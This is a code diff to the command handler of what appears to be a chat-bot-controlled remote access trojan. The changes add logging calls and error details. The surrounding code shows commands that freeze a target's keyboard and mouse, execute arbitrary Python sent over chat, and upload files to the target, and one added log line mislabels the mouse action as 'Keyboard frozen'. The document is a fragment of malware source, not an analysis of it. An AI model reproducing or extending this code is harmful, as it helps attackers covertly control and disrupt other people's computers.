@@ -307,6 +307,7 @@ def handle(msg):
                                         if keyboardFrozen:
                                                 response += 'disabled. To enable, use /unfreeze_keyboard'
                                         else:
+                                                cd.log('w','Keyboard frozen')
                                                 response += 'enabled'
                                 elif command.endswith('freeze_mouse'):
                                         if mouseFrozen == False:                                                   
@@ -318,6 +319,7 @@ def handle(msg):
                                                 pythoncom.PumpMessages()
                                                 response += 'enabled. To disable use /unfreeze_mouse'
                                         elif mouseFrozen == True:
+                                                cd.log('w','Keyboard frozen')
                                                 response += 'enabled. To disable, use /unfreeze_mouse'
                                         else:
                                                 response += 'The script has commited the act of death'
@@ -463,6 +465,7 @@ def handle(msg):
                                         if len(command) == 0:
                                                 response = 'Usage: /python_exec print(\'printing\')'
                                         else:
+                                                cd.log('w','Executing python command')
                                                 from StringIO import StringIO
                                                 import sys
                                                 old_stderr = sys.stderr
@@ -610,8 +613,9 @@ def handle(msg):
                                         cd.log('w','BOT MISUSE: Invalid command')
                                         msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
                                         handle(msg)
-                        except:
+                        except Exception as e:
                                 cd.log('e','BOT MISUSE: Unknown error running command or function.')
+                                cd.log('z','Details from previous error'+str(e))
                                 #raise
                         cd.log('n','Command {} ran'.format(command))
                 else: # Upload a file to target
